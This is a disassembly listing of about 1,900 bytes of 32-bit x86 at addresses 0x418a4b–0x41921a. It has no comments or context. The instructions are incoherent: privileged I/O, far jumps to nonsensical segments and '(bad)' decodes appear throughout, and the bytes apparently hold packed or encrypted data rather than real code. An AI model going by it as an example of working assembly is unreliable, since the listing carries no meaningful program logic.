  418a4b:	out    0xae,eax
  418a4d:	jo     0x418ab1
  418a4f:	dec    ebx
  418a50:	sete   BYTE PTR [esi+0x7f]
  418a54:	mov    WORD PTR [eax+0x51df31c2],es
  418a5a:	or     BYTE PTR [esi+0x190c1d7f],0xfd
  418a61:	jns    0x418aaa
  418a63:	adc    ebp,esp
  418a65:	fidiv  DWORD PTR [ebp+0x14]
  418a68:	jo     0x418ad4
  418a6a:	sub    ebx,eax
  418a6c:	mov    DWORD PTR [esi+0x2c228f8d],edx
  418a72:	add    edi,DWORD PTR [edx+esi*1]
  418a75:	repnz xchg ecx,eax
  418a77:	ds and eax,0xb16e47
  418a7d:	mov    bl,0x21
  418a7f:	das    
  418a80:	es jg  0x418b00
  418a83:	dec    ecx
  418a84:	jle    0x418a9b
  418a86:	or     DWORD PTR [ebp+0x6f66d770],esp
  418a8c:	jecxz  0x418ad6
  418a8e:	mov    ch,0xb3
  418a90:	lock mov ch,0x80
  418a93:	mov    al,0x39
  418a95:	mov    dl,0x91
  418a97:	cmp    eax,0x78e96f28
  418a9c:	popa   
  418a9d:	mov    esi,DWORD PTR [esi+0x7b3c144c]
  418aa3:	pushf  
  418aa4:	mov    WORD PTR [edx+edx*8+0x27],?
  418aa8:	push   esp
  418aa9:	inc    ebp
  418aaa:	sahf   
  418aab:	aas    
  418aac:	mov    ebp,0x399d4902
  418ab1:	adc    al,BYTE PTR [ebp-0x4a2df94c]
  418ab7:	push   ecx
  418ab8:	pushf  
  418ab9:	inc    edi
  418aba:	adc    bh,BYTE PTR [ecx]
  418abc:	leave  
  418abd:	clc    
  418abe:	aaa    
  418abf:	mov    bl,0x7c
  418ac1:	sbb    DWORD PTR [edx],ebp
  418ac3:	dec    edx
  418ac4:	xor    esp,DWORD PTR [eax-0x9706b3b]
  418aca:	or     BYTE PTR [edx*8+0x586764be],bl
  418ad1:	es ins DWORD PTR es:[edi],dx
  418ad3:	mov    edx,0xdf18f211
  418ad8:	pop    ecx
  418ad9:	adc    DWORD PTR [esi+0x510d4b97],esp
  418adf:	push   esp
  418ae0:	outs   dx,DWORD PTR ds:[esi]
  418ae1:	or     al,0x74
  418ae3:	mov    edi,0x1a96db02
  418ae8:	jno    0x418b4a
  418aea:	fcom   DWORD PTR [edi-0x30]
  418aed:	imul   esp,DWORD PTR [ecx+0x2e9a43ae],0xffffffb8
  418af4:	and    DWORD PTR [edi+eax*1-0x1a],esp
  418af8:	add    ch,dh
  418afa:	inc    ebp
  418afb:	ds pop eax
  418afd:	popf   
  418afe:	pop    es
  418aff:	cmp    bl,BYTE PTR [esi+ecx*8-0x34830b52]
  418b06:	data16 add al,0xee
  418b09:	push   0x5c
  418b0b:	jo     0x418b5b
  418b0d:	icebp  
  418b0e:	es out dx,eax
  418b10:	xchg   ecx,eax
  418b11:	mov    dl,0x6b
  418b13:	jo     0x418b24
  418b15:	pushf  
  418b16:	mov    edi,DWORD PTR [edi]
  418b18:	push   ds
  418b19:	inc    edi
  418b1a:	sub    BYTE PTR ss:[eax],bh
  418b1d:	int    0x58
  418b1f:	fst    QWORD PTR [esp+edx*1]
  418b22:	sub    esp,edi
  418b24:	fwait
  418b25:	and    cl,bl
  418b27:	fwait
  418b28:	std    
  418b29:	fidiv  DWORD PTR ds:0x4ed04cdd
  418b2f:	pop    edx
  418b30:	sub    ebp,eax
  418b32:	fwait
  418b33:	cmc    
  418b34:	adc    eax,0xe5c007b8
  418b39:	mov    dh,0x62
  418b3b:	test   eax,0xb4c15cc2
  418b40:	mov    eax,ds:0xe45e4d2b
  418b45:	jne    0x418b1d
  418b47:	jmp    0x418b66
  418b49:	stc    
  418b4a:	rol    BYTE PTR [eax-0x3c],0x38
  418b4e:	mov    WORD PTR [ebx+0x2c00b29a],es
  418b54:	mov    al,0x91
  418b56:	push   edi
  418b57:	iret   
  418b58:	or     DWORD PTR [edx-0x50c209c3],edx
  418b5e:	adc    ebp,DWORD PTR [edi+0x5f]
  418b61:	xchg   edi,eax
  418b62:	mov    bl,0xdb
  418b64:	mov    ah,0x21
  418b66:	lods   al,BYTE PTR ds:[esi]
  418b67:	mov    dl,BYTE PTR [edx+0x42]
  418b6a:	mov    edi,0x452fa88e
  418b6f:	push   ecx
  418b70:	sbb    ecx,DWORD PTR [edi-0x770cec76]
  418b76:	sbb    esp,edx
  418b78:	sub    ecx,ebx
  418b7a:	gs jle 0x418ba0
  418b7d:	cmc    
  418b7e:	lahf   
  418b7f:	loop   0x418b40
  418b81:	jmp    0xd5b1f759
  418b86:	pop    ss
  418b87:	sub    eax,0x8b7fa646
  418b8c:	inc    esp
  418b8d:	cmp    al,0x15
  418b8f:	popa   
  418b90:	mov    cl,0x6a
  418b92:	ss push edx
  418b94:	mov    ah,0x82
  418b96:	or     edi,ebp
  418b98:	dec    edx
  418b99:	add    ecx,esp
  418b9b:	inc    ebx
  418b9c:	dec    esi
  418b9d:	pop    eax
  418b9e:	pusha  
  418b9f:	call   0x8da6:0xe7c209ab
  418ba6:	or     al,BYTE PTR [edx-0x1f26ed84]
  418bac:	dec    ebp
  418bad:	sub    al,0xac
  418baf:	xor    edi,0x54fbce9c
  418bb5:	fnsave [edi]
  418bb7:	int    0xd9
  418bb9:	adc    al,0x3c
  418bbb:	repz pop ss
  418bbd:	daa    
  418bbe:	push   ecx
  418bbf:	adc    al,0x79
  418bc1:	mov    esp,0x9c8af2ab
  418bc6:	jge    0x418bac
  418bc8:	out    dx,al
  418bc9:	push   cs
  418bca:	mov    esp,0xd8f08ccd
  418bcf:	ror    DWORD PTR [edx+0x1c],cl
  418bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bd3:	add    eax,0x53f9520a
  418bd8:	mov    bh,BYTE PTR [ebx+ebx*1-0x21]
  418bdc:	inc    ebx
  418bdd:	les    eax,FWORD PTR [eax+0x23]
  418be0:	ret    0xbf98
  418be3:	and    DWORD PTR [edx-0x1b416d4e],ecx
  418be9:	iret   
  418bea:	ror    DWORD PTR [esi-0x2541755f],1
  418bf0:	cmp    DWORD PTR ds:0xaf0018ad,edx
  418bf6:	xor    DWORD PTR [ebx+0x5039566a],esp
  418bfc:	pop    ds
  418bfd:	out    0x7f,eax
  418bff:	lods   eax,DWORD PTR ds:[esi]
  418c00:	js     0x418bd4
  418c02:	cmc    
  418c03:	fst    DWORD PTR [ecx-0x1f]
  418c06:	fiadd  DWORD PTR [edi+0x35]
  418c09:	xchg   edx,eax
  418c0a:	out    dx,al
  418c0b:	ins    BYTE PTR es:[edi],dx
  418c0c:	sbb    BYTE PTR [ebx],bh
  418c0e:	push   eax
  418c0f:	out    0xae,eax
  418c11:	(bad)  
  418c12:	div    BYTE PTR [edi]
  418c14:	pop    eax
  418c15:	daa    
  418c16:	or     DWORD PTR [ebp-0x8],ecx
  418c19:	fadd   QWORD PTR [esi+0x77]
  418c1c:	leave  
  418c1d:	xchg   ebx,eax
  418c1e:	sbb    al,0xde
  418c20:	(bad)  
  418c21:	mul    cl
  418c23:	les    ebx,FWORD PTR [edx+0x17]
  418c26:	and    al,0x23
  418c28:	icebp  
  418c29:	shl    dh,1
  418c2b:	imul   esp,DWORD PTR [esi+0x1ffc94a],0x52
  418c32:	jnp    0x418bea
  418c34:	push   0xf9cafc3c
  418c39:	sbb    al,0x5c
  418c3b:	mov    dl,ah
  418c3d:	pop    esi
  418c3e:	repnz xor edx,DWORD PTR [ecx]
  418c41:	pop    esi
  418c42:	gs hlt 
  418c44:	fwait
  418c45:	inc    esp
  418c46:	and    DWORD PTR [ebp+0x379ef9aa],edi
  418c4c:	and    bh,BYTE PTR [edx+0x5574f3df]
  418c52:	aas    
  418c53:	icebp  
  418c54:	mov    ebx,0x5f7b454
  418c59:	adc    DWORD PTR [bx+si],esi
  418c5c:	dec    edi
  418c5d:	popf   
  418c5e:	bound  ecx,QWORD PTR [ecx]
  418c60:	mov    eax,ds:0x5d63c8cb
  418c65:	mov    BYTE PTR [ecx+edi*4],bl
  418c68:	sub    DWORD PTR [edx+eiz*1+0x7d],ecx
  418c6c:	cmp    bl,BYTE PTR [edi]
  418c6e:	sbb    al,BYTE PTR [edi]
  418c70:	retf   0x46fd
  418c73:	jnp    0x418c44
  418c75:	push   ebp
  418c76:	cld    
  418c77:	loopne 0x418c34
  418c79:	fistp  DWORD PTR [ecx+0x69]
  418c7c:	or     cl,bl
  418c7e:	hlt    
  418c7f:	test   eax,0xa118d17a
  418c84:	pop    ebx
  418c85:	jmp    0x418c1b
  418c87:	push   ds
  418c88:	dec    ebx
  418c89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c8a:	xchg   esp,eax
  418c8b:	mov    ebp,esp
  418c8d:	iret   
  418c8e:	retf   
  418c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c90:	cmp    al,0x20
  418c92:	mov    ebx,0xaa0612b6
  418c97:	mov    BYTE PTR [ebx+0x4f],cl
  418c9a:	gs push ebp
  418c9c:	adc    DWORD PTR [edi],esi
  418c9e:	add    ebp,ebx
  418ca0:	cmp    DWORD PTR [ebx],eax
  418ca2:	out    dx,al
  418ca3:	cs mov dh,0x92
  418ca6:	add    DWORD PTR [ebx-0xc],esp
  418ca9:	jne    0x418cea
  418cab:	ret    0xa2fa
  418cae:	jmp    0x600e:0x5fc7aa1b
  418cb5:	das    
  418cb6:	add    BYTE PTR [ebx+edi*1-0x72615427],bl
  418cbd:	xchg   esi,eax
  418cbe:	(bad)
  418cc2:	or     ebp,DWORD PTR [edx-0x13]
  418cc5:	add    al,BYTE PTR [esi-0x30f266ee]
  418ccb:	push   edi
  418ccc:	xchg   ecx,eax
  418ccd:	fsubr  DWORD PTR [ebp+0x60]
  418cd0:	fbstp  TBYTE PTR [esi-0x48]
  418cd3:	fucomip st,st(7)
  418cd5:	mov    ds:0x25357428,eax
  418cda:	lds    edi,FWORD PTR [ebx+0x60]
  418cdd:	adc    ah,0xbe
  418ce0:	(bad)  
  418ce4:	push   esi
  418ce5:	jno    0x418ce3
  418ce7:	adc    DWORD PTR [edx-0x6da0d45e],edx
  418ced:	xor    al,0x90
  418cef:	mov    edx,0x84512b04
  418cf4:	jle    0x418d2d
  418cf6:	inc    eax
  418cf7:	xor    al,al
  418cf9:	pop    esp
  418cfa:	mov    ecx,0x30da778d
  418cff:	je     0xcd36ce74
  418d05:	push   edi
  418d06:	repz repz jle 0x418d66
  418d0a:	frstor [eax-0x7e]
  418d0d:	gs std 
  418d0f:	(bad)  
  418d10:	jo     0x418d84
  418d12:	mov    bh,0x4b
  418d14:	push   esp
  418d15:	out    dx,al
  418d16:	test   BYTE PTR [eax+0x15cc65d0],ch
  418d1c:	dec    edx
  418d1d:	or     eax,0x830a6296
  418d22:	push   edx
  418d23:	pushf  
  418d24:	cwde   
  418d25:	or     DWORD PTR [edx+edi*8-0x7a],ebp
  418d29:	bound  esi,QWORD PTR [edx]
  418d2b:	lods   eax,DWORD PTR ds:[esi]
  418d2c:	adc    dh,BYTE PTR [esi-0x6a]
  418d2f:	enter  0xb10b,0xeb
  418d33:	dec    edx
  418d34:	jl     0x418d80
  418d36:	add    eax,0x8e2e6b68
  418d3b:	out    dx,al
  418d3c:	cmp    edi,edi
  418d3e:	popf   
  418d3f:	lods   eax,DWORD PTR ds:[esi]
  418d40:	jae    0x418cd9
  418d42:	hlt    
  418d43:	add    BYTE PTR [eax-0x3fb61c48],0x24
  418d4a:	and    al,0x1
  418d4c:	inc    esi
  418d4d:	and    esp,DWORD PTR [eax-0x77]
  418d50:	mov    dl,BYTE PTR [esi]
  418d52:	and    bh,BYTE PTR [ecx+0x6909f445]
  418d58:	lods   eax,DWORD PTR ds:[esi]
  418d59:	sahf   
  418d5a:	neg    bl
  418d5c:	xor    eax,0xc9fcef4e
  418d61:	sbb    edi,DWORD PTR [eax]
  418d63:	xor    eax,0x34c54fe3
  418d68:	arpl   WORD PTR [edx+0x2c],si
  418d6b:	outs   dx,BYTE PTR ds:[esi]
  418d6c:	out    dx,al
  418d6d:	rcl    cl,0xfe
  418d70:	cs rol ecx,cl
  418d73:	jb     0x418d5c
  418d75:	dec    eax
  418d76:	loope  0x418ddf
  418d78:	dec    eax
  418d79:	xor    ah,0xfc
  418d7c:	sbb    al,0x7
  418d7e:	sub    al,0xa2
  418d80:	sti    
  418d81:	or     edi,esi
  418d83:	xchg   ecx,eax
  418d84:	jp     0x418d10
  418d86:	int3   
  418d87:	cld    
  418d88:	xchg   ebp,eax
  418d89:	fist   WORD PTR [ebx]
  418d8b:	xor    eax,0x7ae8b39
  418d90:	xchg   ecx,eax
  418d91:	dec    ebx
  418d92:	and    dl,BYTE PTR [esi-0x3c0a73b9]
  418d98:	and    al,0x68
  418d9a:	xor    bl,al
  418d9c:	mov    esp,DWORD PTR [edx-0x6f]
  418d9f:	and    eax,0x464b591c
  418da4:	adc    al,0xb6
  418da6:	repz mov eax,0xa4707bc7
  418dac:	pop    edi
  418dad:	inc    ecx
  418dae:	in     al,dx
  418daf:	aam    0x94
  418db1:	in     eax,0xb4
  418db3:	inc    eax
  418db4:	push   cs
  418db5:	dec    ebp
  418db6:	jbe    0x418e20
  418db8:	out    dx,eax
  418db9:	pop    ds
  418dba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dbb:	jmp    0x418d4a
  418dbd:	add    BYTE PTR [esi-0x26],dl
  418dc0:	pop    ecx
  418dc1:	push   0x69
  418dc3:	and    BYTE PTR [esi-0x12],bh
  418dc6:	xor    ch,dh
  418dc8:	xchg   DWORD PTR [esi+edi*4-0x74ba5d77],esp
  418dcf:	pusha  
  418dd0:	xor    al,0xf
  418dd2:	sbb    BYTE PTR [eax],ah
  418dd4:	sti    
  418dd5:	xchg   esp,eax
  418dd6:	pop    eax
  418dd7:	sbb    bl,BYTE PTR [ecx+edi*8+0x2f]
  418ddb:	ins    BYTE PTR es:[edi],dx
  418ddc:	xchg   BYTE PTR [edi+ecx*2],cl
  418ddf:	inc    eax
  418de0:	mov    cl,0xd0
  418de2:	mov    esi,0x52305222
  418de7:	add    edi,DWORD PTR [ecx-0x61]
  418dea:	fidiv  WORD PTR [ecx+0x50]
  418ded:	out    dx,eax
  418dee:	add    al,0x9f
  418df0:	test   al,0xa8
  418df2:	pop    edi
  418df3:	pop    ebp
  418df4:	popa   
  418df5:	or     al,0x36
  418df7:	stos   DWORD PTR es:[edi],eax
  418df8:	test   DWORD PTR [edi-0x14],0xa94ec0db
  418dff:	nop
  418e00:	pop    ds
  418e01:	ss in  al,dx
  418e03:	out    0xf3,al
  418e05:	test   eax,0x81bbe1aa
  418e0a:	cmc    
  418e0b:	jmp    0xfe99:0x4ed7d379
  418e12:	xchg   ebx,esi
  418e14:	xor    al,0x26
  418e16:	hlt    
  418e17:	in     eax,dx
  418e18:	mov    ah,0x76
  418e1a:	and    dl,bl
  418e1c:	pop    ebp
  418e1d:	pop    edi
  418e1e:	jae    0x418e9b
  418e20:	mov    ecx,0x6f88e135
  418e25:	loop   0x418df9
  418e27:	jle    0x418dde
  418e29:	xlat   BYTE PTR ds:[ebx]
  418e2a:	test   al,0x2b
  418e2c:	imul   edx
  418e2e:	je     0x418dc5
  418e30:	pusha  
  418e31:	clc    
  418e32:	xlat   BYTE PTR ds:[ebx]
  418e33:	add    BYTE PTR [edi+0x29c271dc],al
  418e39:	dec    ecx
  418e3a:	jle    0x418e39
  418e3c:	or     al,0x1
  418e3e:	xlat   BYTE PTR ds:[ebx]
  418e3f:	pushf  
  418e40:	inc    ecx
  418e41:	retf   
  418e42:	mov    edi,0xfa4d9dff
  418e47:	mov    eax,0x9d78cbc9
  418e4c:	outs   dx,BYTE PTR ds:[esi]
  418e4d:	cld    
  418e4e:	ss sub eax,0x2cdae2cb
  418e54:	aad    0x18
  418e56:	lds    ebp,FWORD PTR [edx+0x78]
  418e59:	push   ebx
  418e5a:	mov    bl,0x2f
  418e5c:	aam    0x3
  418e5e:	sbb    al,0x1a
  418e60:	adc    al,0x27
  418e62:	jns    0x418ebd
  418e64:	jb     0x418e68
  418e66:	cdq    
  418e67:	xchg   ecx,eax
  418e68:	arpl   WORD PTR [esi+0x6b5d16f2],ax
  418e6e:	test   eax,0x1e758d54
  418e73:	imul   BYTE PTR [ebp-0x13]
  418e76:	ret    0xad12
  418e79:	mov    cl,0x56
  418e7b:	imul   edi,DWORD PTR [ebx+0x2c],0x315e0357
  418e82:	ja     0x418ec0
  418e84:	mov    bl,BYTE PTR [ebx-0x7]
  418e87:	out    0xfb,al
  418e89:	test   eax,0x75782d24
  418e8e:	ja     0x418ef4
  418e90:	cwde   
  418e91:	sub    eax,0xd2acd353
  418e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e97:	jno    0x418ed2
  418e99:	ret    0x98d4
  418e9c:	cmp    eax,0xd7c60e1d
  418ea1:	ficomp DWORD PTR [ecx]
  418ea3:	push   cs
  418ea4:	sbb    DWORD PTR [ecx+0x7ddee1ad],ecx
  418eaa:	xchg   esi,eax
  418eab:	mov    ecx,0xfa1afdaa
  418eb0:	ins    BYTE PTR es:[edi],dx
  418eb1:	dec    ecx
  418eb2:	loope  0x418f17
  418eb4:	inc    edi
  418eb5:	in     eax,dx
  418eb6:	ss jl  0x418e8c
  418eb9:	rcr    DWORD PTR [edx+0x4f0a5d65],0xd7
  418ec0:	xchg   BYTE PTR [ebp+0x403e8728],al
  418ec6:	pop    esi
  418ec7:	pop    edx
  418ec8:	int3   
  418ec9:	shl    ch,1
  418ecb:	cmp    BYTE PTR [ebx-0x622355f1],ch
  418ed1:	out    dx,al
  418ed2:	lods   eax,DWORD PTR ds:[esi]
  418ed3:	mov    ah,BYTE PTR [edi-0x6ac4fbd2]
  418ed9:	xor    eax,0x34bbca5d
  418ede:	ficom  DWORD PTR [esi-0x5d516818]
  418ee4:	into   
  418ee5:	addr16 jl 0x418ea2
  418ee8:	rcl    BYTE PTR [edx],cl
  418eea:	inc    eax
  418eeb:	daa    
  418eec:	les    ebx,FWORD PTR [esi]
  418eee:	outs   dx,DWORD PTR ds:[esi]
  418eef:	int3   
  418ef0:	sub    ch,cl
  418ef2:	mov    ah,0x22
  418ef4:	xchg   eax,eax
  418ef6:	das    
  418ef7:	push   esp
  418ef8:	add    edi,edi
  418efa:	push   edi
  418efb:	enter  0x10da,0x96
  418eff:	fidivr WORD PTR [ecx]
  418f01:	pop    edi
  418f02:	into   
  418f03:	inc    esp
  418f04:	push   esi
  418f05:	sub    eax,0xe5e13262
  418f0a:	sub    DWORD PTR [ebx-0x11],edx
  418f0d:	pop    ecx
  418f0e:	mov    edi,DWORD PTR [ebx]
  418f10:	inc    edx
  418f11:	sar    BYTE PTR [esi],cl
  418f13:	leave  
  418f14:	mov    dh,0x2c
  418f16:	aaa    
  418f17:	sbb    al,0x92
  418f19:	xor    ch,0x34
  418f1c:	sahf   
  418f1d:	xchg   ecx,eax
  418f1e:	or     esp,ebp
  418f20:	iret   
  418f21:	push   es
  418f22:	(bad)  
  418f24:	stc    
  418f25:	into   
  418f26:	int    0x73
  418f28:	aad    0x9b
  418f2a:	inc    esp
  418f2b:	mov    ebp,0x4d48e64b
  418f30:	mov    ebx,0xf65d28f4
  418f35:	add    eax,0xc31c167c
  418f3a:	repz iret 
  418f3c:	rol    BYTE PTR gs:[eax*1+0x39a05b7],0xc1
  418f45:	pmulhw mm2,QWORD PTR [eax-0x49]
  418f49:	sub    esi,ecx
  418f4b:	xor    BYTE PTR [edx+edx*1+0x309a8121],dh
  418f52:	dec    esp
  418f53:	(bad)  
  418f54:	jecxz  0x418f36
  418f56:	dec    esp
  418f57:	ror    BYTE PTR [ebx+ebx*2+0x42],0x29
  418f5c:	hlt    
  418f5d:	mov    ah,0x5a
  418f5f:	push   edx
  418f60:	dec    ecx
  418f61:	push   0x25c46437
  418f66:	mov    eax,0x8c4bff1d
  418f6b:	test   eax,0xd0be6c25
  418f70:	mov    esi,0xdea9364b
  418f75:	out    0x45,al
  418f77:	jmp    0xfeb2eaad
  418f7c:	dec    edx
  418f7d:	mov    ch,0x5a
  418f7f:	stos   DWORD PTR es:[edi],eax
  418f80:	pop    ds
  418f81:	jecxz  0x418fcd
  418f83:	mov    edi,0xaf11a7ec
  418f88:	jle    0x418fa0
  418f8a:	push   ss
  418f8b:	scas   eax,DWORD PTR es:[edi]
  418f8c:	mov    dl,0x8c
  418f8e:	call   0x6f97b294
  418f93:	retf   
  418f94:	ss cs data16 cs daa 
  418f99:	popa   
  418f9a:	rcr    BYTE PTR [ecx+edi*4],cl
  418f9d:	gs dec ebp
  418f9f:	pop    ss
  418fa0:	jp     0x418fef
  418fa2:	sub    al,BYTE PTR [esi]
  418fa4:	ja     0x418fc0
  418fa6:	inc    ecx
  418fa7:	dec    esi
  418fa8:	adc    eax,0xa8b7e946
  418fad:	test   DWORD PTR [ebp-0x72c1178e],0x6ce4b744
  418fb7:	icebp  
  418fb8:	dec    esp
  418fb9:	inc    esi
  418fba:	scas   eax,DWORD PTR es:[edi]
  418fbb:	push   ss
  418fbc:	mov    al,dh
  418fbe:	cmp    ecx,edx
  418fc0:	out    dx,eax
  418fc1:	or     bh,bh
  418fc3:	jg     0x418fce
  418fc5:	popf   
  418fc6:	or     al,0xec
  418fc8:	nop
  418fc9:	pop    edx
  418fca:	fidiv  DWORD PTR [edi-0x6ba2fcb5]
  418fd0:	push   ds
  418fd1:	xchg   ecx,eax
  418fd2:	adc    eax,0x61b13db0
  418fd7:	xor    al,BYTE PTR [ecx]
  418fd9:	scas   al,BYTE PTR es:[edi]
  418fda:	fs sahf 
  418fdc:	xchg   ebp,eax
  418fdd:	jle    0x418f9c
  418fdf:	cmp    DWORD PTR [edx+0x5d],0x53d2e912
  418fe6:	rcr    bh,cl
  418fe8:	mov    bl,0x98
  418fea:	jno    0x418f71
  418fec:	xlat   BYTE PTR ds:[ebx]
  418fed:	outs   dx,BYTE PTR ds:[esi]
  418fee:	and    esp,esi
  418ff0:	std    
  418ff1:	popf   
  418ff2:	mov    eax,ds:0xe51e76e5
  418ff7:	test   cl,ch
  418ff9:	mov    WORD PTR [edx-0x5],?
  418ffc:	outs   dx,DWORD PTR ds:[esi]
  418ffd:	xchg   esp,eax
  418ffe:	sti    
  418fff:	xchg   ebp,eax
  419000:	enter  0xb82d,0x48
  419004:	cdq    
  419005:	(bad)  
  419006:	jmp    DWORD PTR [esi-0x73]
  419009:	jbe    0x419058
  41900b:	jmp    0x4494:0x6b5de233
  419012:	pop    edx
  419013:	ror    DWORD PTR [ecx],1
  419015:	add    DWORD PTR [ebx],0xfb1ace57
  41901b:	mov    al,ds:0x808c224e
  419020:	pop    ecx
  419021:	aad    0x8f
  419023:	adc    cl,dh
  419025:	cmp    bh,BYTE PTR [edx-0x40]
  419028:	retf   
  419029:	mov    ds:0x95aba96f,eax
  41902e:	cmp    ebp,DWORD PTR [ecx]
  419030:	imul   eax,DWORD PTR [ebx+0x61738012],0x69
  419037:	jb     0x41903d
  419039:	ins    BYTE PTR es:[edi],dx
  41903a:	aaa    
  41903b:	push   0x7303fc51
  419040:	ror    BYTE PTR [ebx+edi*8],0xd
  419044:	mov    ?,WORD PTR [eax]
  419046:	adc    eax,0xf520c39d
  41904b:	loope  0x41904d
  41904d:	ins    BYTE PTR es:[edi],dx
  41904e:	loop   0x41907e
  419050:	or     DWORD PTR [esi+edx*2+0x64],ebx
  419054:	cld    
  419055:	enter  0xa378,0xc3
  419059:	fs push ds
  41905b:	int    0xfd
  41905d:	inc    bx
  41905f:	stos   DWORD PTR es:[edi],eax
  419060:	mov    ch,0xff
  419062:	mov    edx,0xf18d5226
  419067:	call   0x4857:0x62c25a69
  41906e:	aaa    
  41906f:	aam    0x5c
  419071:	aas    
  419072:	xor    DWORD PTR [ebp-0x638728cf],esi
  419078:	lea    edi,[ebx]
  41907a:	or     DWORD PTR [ebp-0x26],edx
  41907d:	(bad)  
  41907e:	jecxz  0x419070
  419080:	xchg   edi,eax
  419081:	(bad)  
  419082:	outs   dx,BYTE PTR ds:[esi]
  419083:	in     al,0xab
  419085:	push   ds
  419086:	sub    DWORD PTR [edx+ebp*1-0x448f87ea],0xad1448dc
  419091:	cdq    
  419092:	inc    edi
  419093:	mov    ch,0x8
  419095:	mov    ecx,0x13af6c9
  41909a:	fisttp QWORD PTR [edx-0x6a]
  41909d:	xchg   edx,eax
  41909e:	out    0x12,eax
  4190a0:	and    al,0x10
  4190a2:	xor    DWORD PTR [eax],0x1a
  4190a5:	fwait
  4190a6:	inc    esp
  4190a7:	call   0xd92f4cb6
  4190ac:	push   esp
  4190ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190ae:	inc    edx
  4190af:	and    al,0xa5
  4190b1:	in     al,dx
  4190b2:	pop    esi
  4190b3:	aaa    
  4190b4:	cmp    al,cl
  4190b6:	pop    es
  4190b7:	xchg   DWORD PTR [esi+0x7cc38a0d],ebx
  4190bd:	adc    ecx,DWORD PTR [ebp-0x61434d7a]
  4190c3:	nop
  4190c4:	jecxz  0x41913a
  4190c6:	and    ah,BYTE PTR [edx+0x77]
  4190c9:	push   ss
  4190ca:	mov    ecx,0x6f9762e6
  4190cf:	add    al,0x61
  4190d1:	fs push 0x3104ee40
  4190d7:	nop
  4190d8:	cmp    DWORD PTR [edi+0x71ea5d70],ebp
  4190de:	ret    0xce3b
  4190e1:	nop
  4190e2:	stos   DWORD PTR es:[edi],eax
  4190e3:	nop
  4190e4:	and    dh,dl
  4190e6:	arpl   WORD PTR [ecx-0x12b72e84],ax
  4190ec:	dec    edx
  4190ed:	mov    ch,0x48
  4190ef:	inc    esp
  4190f0:	jnp    0x4190e0
  4190f2:	xchg   al,cl
  4190f4:	jnp    0x4190f8
  4190f6:	dec    ebp
  4190f7:	lock stc 
  4190f9:	nop
  4190fa:	xchg   edi,eax
  4190fb:	out    dx,eax
  4190fc:	pop    edx
  4190fd:	xchg   edx,esp
  4190ff:	in     eax,0x23
  419101:	cwde   
  419102:	or     dl,BYTE PTR [ebx]
  419104:	xchg   BYTE PTR [ecx+0x73fc8544],al
  41910a:	mov    bl,0x87
  41910c:	push   edi
  41910d:	lock add eax,0x249cfac9
  419114:	in     eax,dx
  419115:	xchg   esp,eax
  419116:	(bad)  
  419118:	cmc    
  419119:	or     BYTE PTR es:[ebx+0x2601295f],0x8a
  419121:	mov    al,ds:0x8135ed3
  419126:	sub    BYTE PTR [eax+0xe5e688],bl
  41912c:	dec    esp
  41912d:	leave  
  41912e:	int    0x58
  419130:	mov    DWORD PTR [esi+0x16],esi
  419133:	push   eax
  419134:	lods   al,BYTE PTR ds:[esi]
  419135:	js     0x4190cc
  419137:	adc    DWORD PTR [ebx+edx*8],ebx
  41913a:	nop
  41913b:	enter  0xb05e,0xda
  41913f:	clc    
  419140:	add    DWORD PTR ds:0xdb4252e5,ebx
  419146:	add    esp,0xd254d115
  41914c:	and    DWORD PTR [esi-0x57a9912],0x27269f71
  419156:	arpl   bx,bx
  419158:	sub    DWORD PTR [esi],esp
  41915a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41915b:	hlt    
  41915c:	ret    
  41915d:	or     BYTE PTR [edx],0xbd
  419160:	jecxz  0x4190ee
  419162:	inc    ebp
  419163:	aad    0x29
  419165:	enter  0x7abf,0x24
  419169:	push   ss
  41916a:	mov    edi,0x75e138f
  41916f:	bound  ebx,QWORD PTR [edi+0x2dfe98c2]
  419175:	add    eax,0xd1455cae
  41917a:	adc    bh,BYTE PTR [edi]
  41917c:	and    edx,DWORD PTR [ebp-0x72708259]
  419182:	mov    ecx,0x236dfc6d
  419187:	sub    cl,cl
  419189:	imul   ecx,esi,0x8ec61788
  41918f:	inc    ecx
  419190:	(bad)  [edi+0x4a]
  419193:	enter  0x28c,0x50
  419197:	xchg   esi,eax
  419198:	loop   0x419147
  41919a:	fnstsw WORD PTR [edi+eiz*2]
  41919d:	ja     0x4191ce
  41919f:	scas   al,BYTE PTR es:[edi]
  4191a0:	dec    edi
  4191a1:	repnz lods al,BYTE PTR ds:[esi]
  4191a3:	cli    
  4191a4:	jg     0x419166
  4191a6:	cmp    DWORD PTR [ecx+0x2e],ecx
  4191a9:	call   0xab9eb150
  4191ae:	add    DWORD PTR [ecx],ecx
  4191b0:	push   esi
  4191b1:	out    0xb4,al
  4191b3:	data16 mov al,ds:0xb8b3ae7d
  4191b9:	out    0x9e,al
  4191bb:	popf   
  4191bc:	shl    DWORD PTR [eax+0x706750b1],1
  4191c2:	shl    ebx,cl
  4191c4:	jmp    0x41919a
  4191c6:	data16 jp 0x4191e3
  4191c9:	fidiv  DWORD PTR ds:0xdd32185d
  4191cf:	xchg   esp,eax
  4191d0:	pop    ebp
  4191d1:	sub    DWORD PTR [ecx-0x3c7a3aae],0xac9ddbd7
  4191db:	retf   0x220b
  4191de:	and    DWORD PTR [ecx],ebp
  4191e0:	push   es
  4191e1:	push   ebp
  4191e2:	push   edi
  4191e3:	push   0xa
  4191e5:	test   DWORD PTR ds:0x538e1da8,edx
  4191eb:	addr16 into 
  4191ed:	ja     0x4191bd
  4191ef:	or     DWORD PTR [ecx-0x2e],0x54d66955
  4191f6:	add    BYTE PTR ds:0x7ae0cd86,ah
  4191fc:	xor    dh,BYTE PTR [edx+0x2c]
  4191ff:	mov    ah,0x3b
  419201:	dec    edi
  419202:	xchg   edx,eax
  419203:	cmp    BYTE PTR [esi],ch
  419205:	mov    eax,0xc063853
  41920a:	imul   ebx,DWORD PTR [edx+0x6f],0x4d
  41920e:	in     eax,0xed
  419210:	retf   
  419211:	or     al,0x80
  419213:	mov    ebp,0x4adde535
  419218:	imul   ebp,DWORD PTR [esi-0x4d],0xa520555f
